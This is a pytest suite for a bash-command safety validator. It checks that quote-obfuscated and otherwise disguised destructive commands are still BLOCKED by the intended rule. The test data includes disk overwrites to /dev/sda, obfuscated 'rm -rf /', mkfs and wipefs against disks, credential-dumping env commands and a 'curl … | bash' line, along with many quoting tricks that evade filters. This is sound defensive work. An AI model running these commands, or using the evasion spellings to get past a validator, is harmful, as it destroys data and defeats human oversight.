r"""Redirect targets reach the rule passes, so quoting one no longer hides it (LAB-2760).

Two independent walkers used to skip `redirect` nodes. A redirect node carries no
`.word` - its target hangs off `.output` - so `_collect_words` dropped the target
out of the reconstruction and `echo a > "/dev/sda"` reconstructed to `echo a`. The
original-form pass still saw the raw text, but every disk rule is written
`>\s*/dev/[sh]d[a-z]`, which two quote characters defeat. Both passes blind at once,
on a command that overwrites a disk.

Three lessons from this ticket's own review are baked into how these tests are
written, because each one hid a live bug behind a green suite:

1. **Assert the RULE, not just the tier** (LAB-4270/4317). A verdict-only assertion
   cannot tell "BLOCKED by the rule that should fire" from "BLOCKED by something
   else", and a since-removed early-return floor once returned BLOCKED with an empty
   `matched_rules`.
2. **Pin ABSOLUTE values, never "same tier as the control"** (LAB-1584). A
   tier-equality assertion survives a mutation that drops both sides together.
3. **Pick the compound form with MORE than one segment.** The first draft of this
   file tested `{ echo a; }`, the one compound that collapses to a single segment
   and so takes the working path - it was green while `while`/`if` were still
   wide open.

ShellCheck is forced unavailable throughout: it is optional, and a defence that only
holds when it happens to be installed is not a defence.
"""

from unittest.mock import patch

import pytest

from schlock.core.parser import BashCommandParser
from schlock.core.rules import RiskLevel
from schlock.core.validator import (
    _get_rule_engine,
    _match_original_and_reconstructed,
    clear_caches,
    validate_command,
)


@pytest.fixture(autouse=True)
def _no_shellcheck():
    """Rule passes only - ShellCheck must not be able to mask a regression."""
    clear_caches()
    with patch("schlock.core.validator.is_shellcheck_available", return_value=False):
        yield
    clear_caches()


def _verdict(command, rules):
    """(risk_level, matched_rules) - the rule name is half the assertion."""
    result = validate_command(command, config_path=rules)
    return result.risk_level, tuple(result.matched_rules or ())


def _risk(command, rules):
    return validate_command(command, config_path=rules).risk_level


def _reconstruct(command):
    parser = BashCommandParser()
    return parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))[0]


class TestQuotedRedirectTargetIsVisible:
    """AC-1: a quoted target classifies exactly as its unquoted control does."""

    @pytest.mark.parametrize(
        ("command", "control", "rule"),
        [
            ('echo a > "/dev/sda"', "echo a > /dev/sda", "disk_destruction_dd"),
            ('printf x > "/boot/vmlinuz"', "printf x > /boot/vmlinuz", "disk_destruction_dd"),
            ('cat x > "/dev/nvme0n1"', "cat x > /dev/nvme0n1", "disk_destruction_dd"),
            ('echo a >> "/dev/sda"', "echo a >> /dev/sda", "disk_destruction_dd"),
            ('echo a 2> "/dev/sda"', "echo a 2> /dev/sda", "disk_destruction_dd"),
        ],
    )
    def test_quoted_target_is_blocked_by_the_same_rule(self, command, control, rule, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, (rule,))
        assert _verdict(control, safety_rules_path) == (RiskLevel.BLOCKED, (rule,))


class TestCompoundRedirectsAreReached:
    """A compound hangs its redirections off `.redirects`, never off `.parts`.

    `_segment_nodes` recurses PAST the compound into its `.list`, so the redirection
    belongs to no segment and no per-segment reconstruction can carry it. Every form
    below except `{ echo a; }` yields more than one segment, which is the path that
    was still blind after the first fix.
    """

    @pytest.mark.parametrize(
        "command",
        [
            'while true; do echo a; done > "/dev/sda"',
            'if true; then echo a; fi > "/dev/sda"',
            'for i in 1 2; do ls; echo a; done > "/dev/sda"',
            '{ ls; echo a; } > "/dev/sda"',
            '( ls; echo a ) > "/dev/sda"',
            # A segment matching at a LOWER tier must not skip the whole-command pass.
            '{ rm -f foo; echo a; } > "/dev/sda"',
        ],
    )
    def test_quoted_compound_target_is_blocked(self, command, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, ("disk_destruction_dd",))

    @pytest.mark.parametrize(
        "command",
        ["if true; then ls -la; fi > out.txt", "if true; then git status; fi > out.txt"],
    )
    def test_ordinary_compound_redirect_is_untouched(self, command, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.SAFE, ())


class TestRedirectFreeFormStillMatches:
    """The redirect-FREE reconstruction is load-bearing in its own right.

    A whole family of rules is written to STOP at a redirect on purpose - rule 08's
    `(rm|mv|cp)\\s+[^>]{0,200}/(etc|...)/` excludes `>` by name "to avoid matching
    through redirects like 2>/dev/null", and rule 03 anchors bare `^\\s*env\\s*$`.
    Emitting the redirect INTO the reconstruction silently un-matched all of them:
    every command here went BLOCKED -> allowed until both forms were matched.
    """

    @pytest.mark.parametrize(
        ("command", "rule"),
        [
            ("fdisk 2>/dev/null /dev/sda", "partition_manipulation"),
            ("rm -rf 2>/dev/null /etc/foo", "protect_system_files"),
            ("rm 2>&1 /sbin/init", "protect_system_files"),
            ("cp 2>/dev/null a /boot/b", "protect_system_files"),
            ("env > creds.txt", "environment_credential_extraction"),
            ("printenv >> x", "environment_credential_extraction"),
            ("export -p > x", "environment_credential_extraction"),
            ("env 2>/dev/null", "environment_credential_extraction"),
        ],
    )
    def test_rule_that_excludes_redirects_still_fires(self, command, rule, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, (rule,))


class TestSubstitutionUsedAsRedirectTarget:
    """A substitution under a redirect target reaches SubstitutionValidator.

    Emitting the target is NOT enough: bashlex keeps a process-substitution word
    verbatim, quotes and all, so the regex pass reads `<("rm" -rf /)` and matches
    nothing. The substitution walker has to descend into `output` - and into
    `redirects`, or every compound form stays blind.
    """

    @pytest.mark.parametrize(
        "command",
        [
            'cat < <("rm" -rf /)',
            "echo a > \"$(r''m -rf /)\"",
            "{ echo a; } > \"$(r''m -rf /)\"",
            "( echo a ) > \"$(r''m -rf /)\"",
            '{ echo a; } < <("rm" -rf /)',
        ],
    )
    def test_obfuscated_substitution_target_is_blocked(self, command, safety_rules_path):
        assert _risk(command, safety_rules_path) is RiskLevel.BLOCKED


class TestOperatorSpellingsTheRulesCanRead:
    """`>|` and word-target `>&` write a file exactly as `>` and `&>` do.

    Every path rule is `>\\s*…`; both `|` and `&` interpose a character that breaks
    the `\\s*`, so emitting `node.type` verbatim routed the target to the rules in a
    spelling none of them could match.
    """

    @pytest.mark.parametrize("command", ["cat x >| /dev/sda", "echo a 2>| /dev/sda", "echo a >& /dev/sda"])
    def test_aliased_operator_is_blocked(self, command, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, ("disk_destruction_dd",))

    @pytest.mark.parametrize("command", ["echo a >&2", "cmd 2>&-", "echo a >&-"])
    def test_fd_duplication_and_close_stay_safe(self, command, safety_rules_path):
        """An fd target is an int and `>&-` leaves `output` a bare `-`: neither is a path."""
        assert _verdict(command, safety_rules_path) == (RiskLevel.SAFE, ())


class TestSubstitutionVerdictCannotUndercutTheRules:
    """A denied substitution must not LOWER the command's risk.

    `hooks/pre_tool_use.py` maps the decision off `risk_level` alone, so a BLOCKED
    command demoted to HIGH is deny -> allow under the permissive preset. The join that
    prevents it is `validate_command`'s deferred substitution join (#164). These cases
    pin it from the redirect side, which #164's own tests do not: a quoted redirect
    target and a quoted command name are reconstruction-only detections, and each must
    still win the join and be CREDITED, not merely reach the right tier.
    """

    @pytest.mark.parametrize(
        ("command", "rule"),
        [
            ("mkfs.ext4 $(base64 -d f)", "filesystem_format"),
            # Reconstruction-only detections: only the rule pass sees these.
            ('"mkfs.ext4" $(base64 -d f)', "filesystem_format"),
            ('echo $(base64 -d f) > "/dev/sda"', "disk_destruction_dd"),
            # Multi-segment: the leading whitelisted `ls` must not vouch for the chain.
            ("ls && mkfs.ext4 /dev/sda $(base64 -d f)", "filesystem_format"),
        ],
    )
    def test_rule_verdict_outranks_a_weaker_substitution(self, command, rule, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, (rule,))

    def test_substitution_risk_survives_when_no_rule_is_louder(self, safety_rules_path):
        """The join takes the higher verdict; it must not flatten every substitution to BLOCKED."""
        assert _risk("ls $(base64 -d f)", safety_rules_path) is RiskLevel.HIGH


class TestCompoundPassReadsTheParsedText:
    """The compound pass must match the same text its heredoc ranges index.

    A quoted heredoc delimiter is normalised before parsing and its body blanked, so the
    parsed text and the submitted text differ. Matching the submitted text against the
    parsed text's ranges leaves the real body unsuppressed.
    """

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            ("{ cat <<'EOF'\nrm -rf /\nEOF\n} > out.txt; echo b", (RiskLevel.SAFE, ())),
            ("{ bash <<'EOF'\nrm -rf /\nEOF\n} > out.txt; echo b", (RiskLevel.BLOCKED, ("shell_delegated_payload",))),
        ],
    )
    def test_quoted_heredoc_inside_a_redirected_compound(self, command, expected, safety_rules_path):
        assert _verdict(command, safety_rules_path) == expected


class TestUseWhitelistGovernsEveryForm:
    """`use_whitelist=False` must reach the original-form pass, not only the reconstructions.

    A command can reconstruct to exactly its own text, in which case the reconstructed
    pass is skipped as a duplicate and the original form is the only one that runs. If
    that pass ignored the flag, a caller asking for no whitelist would silently get one.
    """

    def test_original_form_honours_use_whitelist_false(self):
        parser = BashCommandParser()
        command = "ls > /dev/sda"
        ast = parser.parse(command)
        assert parser.reconstruct_command_with_suppression_ranges(command, ast)[0] == command
        match = _match_original_and_reconstructed(
            _get_rule_engine(None),
            parser,
            command,
            ast,
            string_literals=parser.extract_string_literals(command, ast),
            quote_source=command,
            use_whitelist=False,
        )
        assert (match.risk_level, match.rule.name) == (RiskLevel.BLOCKED, "disk_destruction_dd")


class TestOrdinaryRedirectsAreUnaffected:
    """AC-2: absolute verdicts. The /dev/null carve-outs in particular must not move."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo x > /dev/null",
            "cmd 2>/dev/null",
            "cmd 2> /dev/null",
            "cat a > out.txt",
            'cat a > "my notes.txt"',
            'git log > "release notes.md"',
            "cmd >> out.log",
            "cmd 2>&1",
            "cmd &> /dev/null",
            # Split quoting still names /dev/null, so the carve-out holds.
            "echo x > \"/dev/\"'null'",
        ],
    )
    def test_verdict_is_safe(self, command, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.SAFE, ())


class TestSpacingIsReproducedNotNormalised:
    """Reconstruction resolves quoting; it must not re-space.

    Rule 04's `\\bshred\\s+.{0,100}\\s+/dev/` keys on whitespace before `/dev/`, so
    rendering `2>/dev/null` as `2> /dev/null` reclassifies an ordinary stderr discard
    as filesystem wiping. The rule set already disagrees with itself about the two
    spellings; reconstruction must not drag the common one onto the over-blocking side.
    """

    def test_glued_stderr_discard_does_not_become_a_wipe(self, safety_rules_path):
        assert _verdict("shred old.txt 2>/dev/null", safety_rules_path) == (RiskLevel.SAFE, ())
        assert _verdict("shred /var/log/y 2>/dev/null", safety_rules_path) == (RiskLevel.HIGH, ("log_tampering",))

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            ("shred old.txt 2>/dev/null", "shred old.txt 2>/dev/null"),
            ("shred old.txt 2> /dev/null", "shred old.txt 2> /dev/null"),
            ('echo a > "/dev/sda"', "echo a > /dev/sda"),
            ('echo a >"/dev/sda"', "echo a >/dev/sda"),
            ("cmd 2>&1", "cmd 2>&1"),
        ],
    )
    def test_reconstruction_reproduces_the_gap(self, command, expected):
        parser = BashCommandParser()
        reconstructed, _ = parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))
        assert reconstructed == expected

    def test_both_reconstructions_are_available(self):
        """The two forms are a pair, not a migration step - each matches rules the other cannot."""
        parser = BashCommandParser()
        command = "fdisk 2>/dev/null /dev/sda"
        ast = parser.parse(command)
        assert parser.reconstruct_command_with_suppression_ranges(command, ast)[0] == "fdisk 2>/dev/null /dev/sda"
        assert parser.reconstruct_without_redirects(command, ast)[0] == "fdisk /dev/sda"


class TestDataOperandsStayOut:
    """A `<<<` payload is data: it executes only when the command is a shell.

    Emitting it unsuppressed would over-block `cat <<< "rm -rf /"`, which prints text.
    Deciding shell-vs-data is `_here_string_program`'s job (LAB-2768), not this set's.
    """

    def test_here_string_payload_is_not_promoted(self, safety_rules_path):
        assert _risk('cat <<< "rm -rf /"', safety_rules_path) is RiskLevel.HIGH

    def test_heredoc_body_stays_inert(self, safety_rules_path):
        assert _risk("cat << EOF\nrm -rf /\nEOF", safety_rules_path) is RiskLevel.SAFE


class TestDollarPrefixedQuoteForms:
    """`$'…'` and `$"…"` are a third way to spell a hidden target.

    bashlex keeps the `$` of each marker in the word, at any offset, and its quote
    removal breaks on adjacent quoted runs, so the word matches no path rule. Found by
    adversarial review, then by CodeRabbit for markers past the first character.
    """

    @pytest.mark.parametrize(
        ("command", "rule"),
        [
            ("echo x > $'/dev/sda'", "disk_destruction_dd"),
            ('echo x > $"/dev/sda"', "disk_destruction_dd"),
            ('echo x > ""$"/dev/sda"', "disk_destruction_dd"),
            ("echo x > $''$'/dev/sda'", "disk_destruction_dd"),
            ('echo a > "/dev/"$"sda"', "disk_destruction_dd"),
            ("echo a > /$'dev'/sda", "disk_destruction_dd"),
            ("echo a > $'/'$'dev/sda'", "disk_destruction_dd"),
            ("echo a > '/'$'dev/sda'", "disk_destruction_dd"),
            ("echo a > \"\"'/dev/sda'", "disk_destruction_dd"),
            ("echo a > \"\"$'/dev/sda'", "disk_destruction_dd"),
            ("echo a > /e$'tc'/passwd", "protect_system_files"),
            # A `$` inside a quoted run is literal, not a marker: these name `/dev/nul$l`.
            ("echo x > '/dev/nul$'l", "protect_system_files"),
            ('echo x > "/dev/nul$"l', "protect_system_files"),
        ],
    )
    def test_dollar_quoted_target_is_blocked(self, command, rule, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, (rule,))

    @pytest.mark.parametrize(
        "target",
        ["$'/dev/sda'", "/dev/$'sda'", "/dev/s$'da'", '"/dev/"$"sda"', "/$'dev'/sda", "'/'$'dev/sda'", "\"\"'/dev/sda'"],
    )
    def test_target_reconstructs_unquoted(self, target):
        assert _reconstruct(f"echo a > {target}") == "echo a > /dev/sda"

    @pytest.mark.parametrize(
        ("command", "expected"),
        [
            # Not a marker: a real expansion, a `$` in quotes, and the PID.
            ("echo x > $HOME/out.txt", "echo x > $HOME/out.txt"),
            ("echo x > '$'\"/dev/sda\"", "echo x > $/dev/sda"),
            ("echo x > $$'/dev/sda'", "echo x > $$/dev/sda"),
            # An escaped quote would shift the scan's quoted runs, so it is not rebuilt.
            ('echo a > "\\"$\'x\'"', "echo a > \"$'x'"),
            # A span shlex splits is not rebuilt from its first fragment.
            ("echo a > $'/dev/sda'$(echo a b)", "echo a > /dev/sda$(echo a b)"),
            # Unrebuilt (a backslash), the decoded word keeps the expansion's `$`.
            ('echo a >> $"$HOME"/.bash\\rc', "echo a >> $HOME/.bashrc"),
        ],
    )
    def test_only_markers_are_dropped(self, command, expected):
        assert _reconstruct(command) == expected

    @pytest.mark.parametrize(
        ("command", "rule"),
        [
            # A backslash or a multi-word span skips the rebuild; the word parse() decoded
            # has no markers left, even behind an empty fragment.
            ("echo a > $'/etc/passwd\\x00'", "protect_system_files"),
            ("echo a > $'/dev/sda'$(echo a b)", "disk_destruction_dd"),
            ("echo a > ''$'/dev/'\\sda", "disk_destruction_dd"),
            ("echo a > ''$'/dev/sda'${x:+ }", "disk_destruction_dd"),
        ],
    )
    def test_unrebuilt_target_still_loses_its_leading_markers(self, command, rule, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, (rule,))

    def test_real_expansion_after_a_marker_keeps_its_dollar(self, safety_rules_path):
        """Only the marker's `$` goes; `$HOME` behind it stays an expansion."""
        assert _verdict('echo a >> $"$HOME"/.bash\\rc', safety_rules_path) == (RiskLevel.HIGH, ("dotfile_persistence",))


class TestNormalisedDescriptorDoesNotInventAGap:
    r"""bashlex normalises the descriptor, so source width cannot be re-derived from it.

    Source `02>` arrives as `input=2`; arithmetic on `len(str(fd))` is one short and
    invents whitespace that is not in the source. That mattered because rule 04's
    `\bshred\s+.{0,100}\s+/dev/` keys on whitespace before `/dev/`. Glue is now read
    from the source character before the target instead.
    """

    @pytest.mark.parametrize("fd", ["2", "02", "002", "0002"])
    def test_zero_padded_stderr_discard_stays_safe(self, fd, safety_rules_path):
        assert _verdict(f"shred old.txt {fd}>/dev/null", safety_rules_path) == (RiskLevel.SAFE, ())

    @pytest.mark.parametrize("fd", ["2", "02", "002", "0002"])
    def test_reconstruction_keeps_the_source_glue(self, fd):
        """The descriptor normalises to `2`; what must survive is the ABSENCE of a gap."""
        parser = BashCommandParser()
        command = f"cmd x {fd}>/dev/null"
        reconstructed, _ = parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))
        assert reconstructed == "cmd x 2>/dev/null"

    @pytest.mark.parametrize("fd", ["2", "02", "002"])
    def test_a_real_gap_is_still_reproduced(self, fd):
        parser = BashCommandParser()
        command = f"cmd x {fd}> /dev/null"
        reconstructed, _ = parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))
        assert reconstructed == "cmd x 2> /dev/null"


class TestProcessSubstitutionHeredocIsCode:
    """A heredoc inside `<( … )` is code, whatever command inside it takes the body.

    What reads the substitution may run what it prints - `bash <(cat <<EOF … )` executes
    the body - and nothing at the heredoc knows the reader. The quoted-delimiter path
    already treated such a body as code, but `extract_heredoc_ranges` judged it by the
    command inside (`cat`) and marked it inert, so the rule passes suppressed it and a
    shell running `rm -rf /` came out SAFE.

    Every template is one segment; they differ in which reconstruction form carries the
    body. Multi-segment spellings are left out on purpose: the unconditional
    whole-command scan already denied them, so a test built on one could not fail.
    """

    BODY = "cat <<EOF\nrm -rf /\nEOF\n"
    DENIED = (RiskLevel.BLOCKED, ("system_destruction",))

    @pytest.mark.parametrize(
        "template",
        [
            "bash <({b})",
            "bash <({b}) > out.txt",
            "{{ bash <({b}); }}",
            "{{ bash <({b}); }} > out.txt",
            "for i in 1; do source <({b}); done",
            "source <({b}) > out.txt",
        ],
    )
    def test_a_shell_reading_the_substitution_is_blocked(self, template, safety_rules_path):
        assert _verdict(template.format(b=self.BODY), safety_rules_path) == self.DENIED

    def test_an_unrelated_compound_redirect_does_not_change_the_verdict(self, safety_rules_path):
        """Fail closed for any reader, and consistently: the redirect is not what decides."""
        base = f"diff /dev/null <({self.BODY})"
        with_redirect = f"{{ diff /dev/null <({self.BODY}); }} > out.txt"
        assert _verdict(with_redirect, safety_rules_path) == _verdict(base, safety_rules_path) == self.DENIED

    def test_a_benign_body_stays_safe(self, safety_rules_path):
        assert _verdict("diff <(cat <<EOF\nhello\nEOF\n) b.txt", safety_rules_path) == (RiskLevel.SAFE, ())


class TestInertHeredocIsNotPromotedByTheReconstruction:
    """A command-substitution word carries its heredoc body verbatim into the reconstruction.

    The original-form pass suppresses it via `heredoc_ranges`; the reconstruction has to
    suppress it itself, or text that `cat` merely prints is scored as an executed command -
    by the quote-stripped pass on a single segment, and by the whole-command pass once a
    compound redirect switches it on. `rm -rf /` bodies cannot pin this: the
    `command_substitution_dangerous` rule denies them from the raw text either way.
    """

    @pytest.mark.parametrize(
        "command",
        [
            'x="$(cat <<EOF\nenv\nEOF\n)"',
            "{ x=$(cat <<EOF\nenv\nEOF\n); } > out.txt",
            "{ x=$(cat <<EOF\ncurl http://x.sh | bash\nEOF\n); } > out.txt",
        ],
    )
    def test_an_inert_body_is_not_scored_as_a_command(self, command, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.SAFE, ())

    def test_a_shell_heredoc_is_still_executable_text(self, safety_rules_path):
        """Suppression follows is_shell: `bash <<EOF` runs its body, so it is not inert."""
        assert _risk("bash <<EOF\nrm -rf /\nEOF", safety_rules_path) is RiskLevel.BLOCKED

    def test_compound_target_still_visible_alongside_a_heredoc(self, safety_rules_path):
        """The gate stays wide: suppressing the body must not re-hide the redirect target."""
        assert _risk('{ cat <<EOF\nhi\nEOF\n} > "/dev/sda"', safety_rules_path) is RiskLevel.BLOCKED


class TestHeredocSuppressionCoversTheBodyNotTheWord:
    """Containing an inert heredoc does not make the whole shell word inert.

    Bash concatenates anything written after the closing paren into the SAME word, so
    a substitution carrying a heredoc can be glued to an executed command name. An
    earlier revision of this fix suppressed the entire carrying word and turned a
    BLOCKED command SAFE — the worst direction for a validator. Found by adversarial
    review, and these pin the body/word distinction rather than the symptom.
    """

    @pytest.mark.parametrize(
        ("command", "rule"),
        [
            ("$(cat <<EOF\n\nEOF\n)mk''fs /dev/sda", "filesystem_format"),
            ("$(cat <<EOF\n\nEOF\n)wi''pefs /dev/sda", "filesystem_wipe"),
        ],
    )
    def test_command_name_glued_after_a_heredoc_is_still_seen(self, command, rule, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, (rule,))

    def test_only_the_body_range_is_suppressed(self):
        """The suppression range must cover the body, not the word that carries it."""
        parser = BashCommandParser()
        command = "$(cat <<EOF\n\nEOF\n)mk''fs /dev/sda"
        reconstructed, ranges = parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))
        assert "mkfs" in reconstructed
        # every range is strictly shorter than the word that contains the heredoc
        assert ranges and all(end - start <= len("\nEOF") for start, end in ranges)


class TestHeredocSuppressionRequiresProvenance:
    """Text equality is not provenance: a word must OWN the heredoc to be suppressed by it.

    An empty heredoc's range is its own delimiter, so searching every word for the
    body's text suppressed words that merely happened to spell the same thing —
    `mk''fs "mkfs" <<mkfs` suppressed the executable name because the delimiter
    matched it, while the heredoc belonged to a sibling redirect and not to that word
    at all. Third fail-open in this area, and the reason ownership is now a span test
    with the text search confined to the owning word.
    """

    @pytest.mark.parametrize(
        ("command", "rule"),
        [
            ("mk''fs \"mkfs\" <<mkfs\nmkfs\n", "filesystem_format"),
            ("wi''pefs --all \"wipefs\" <<wipefs\nwipefs\n", "filesystem_wipe"),
            ("mk''fs -L \"mkfs\" /dev/sda <<mkfs\nmkfs\n", "filesystem_format"),
        ],
    )
    def test_delimiter_text_does_not_suppress_an_unrelated_word(self, command, rule, safety_rules_path):
        assert _verdict(command, safety_rules_path) == (RiskLevel.BLOCKED, (rule,))

    def test_sibling_redirect_heredoc_suppresses_nothing(self):
        """A heredoc on a sibling redirect is owned by no word, so it grants no suppression."""
        parser = BashCommandParser()
        command = "mk''fs \"mkfs\" <<mkfs\nmkfs\n"
        reconstructed, ranges = parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))
        assert "mkfs" in reconstructed
        assert ranges == []


class TestSuppressionRangeProvenanceIsPinned:
    """The ownership test and the occurrence choice, pinned independently of any verdict.

    Both of these are range-contract assertions rather than risk assertions: they hold
    the suppression API to reporting a range it can actually justify. A verdict-level
    test cannot see either defect, which is why both shipped green twice.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "cat <<MARKER\nMARKER\nMARKER_suffix_long",
            "cat <<MARKER\nMARKER\necho MARKER_suffix_long",
        ],
    )
    def test_a_word_that_owns_no_heredoc_is_never_suppressed(self, command):
        """Kills the guard-removal mutant.

        Without the ownership span test the window end goes NEGATIVE, and Python reads
        a negative `end` as relative to the string's end rather than as an empty
        interval — `"MARKER_suffix_long".rfind("MARKER", 0, -1)` is 0. The arithmetic
        bound therefore does NOT subsume ownership, contrary to what the code's author
        argued; only the span test rejects these.
        """
        parser = BashCommandParser()
        _, ranges = parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))
        assert ranges == []

    @pytest.mark.parametrize("tail", ["'marker\nX'", "'marker\nXtail'"])
    def test_an_ambiguous_occurrence_declines_rather_than_guesses(self, tail):
        """Two copies of the body inside one owning word: the mapping is unestablished.

        Quote resolution removes characters only before the real body here, so the
        window legitimately spans both copies. The window shows an occurrence COULD be
        the body, never that it IS — so nothing is suppressed, rather than a range
        mis-attributed to the later copy.
        """
        parser = BashCommandParser()
        command = "echo " + '""' * 30 + "$(cat <<X\nmarker\nX\n)" + tail
        _, ranges = parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))
        assert ranges == []

    def test_an_unambiguous_body_is_still_suppressed(self):
        """Declining on ambiguity must not disable the mechanism in the ordinary case."""
        parser = BashCommandParser()
        command = "x=$(cat <<EOF\nrm -rf /\nEOF\n)"
        _, ranges = parser.reconstruct_command_with_suppression_ranges(command, parser.parse(command))
        assert len(ranges) == 1
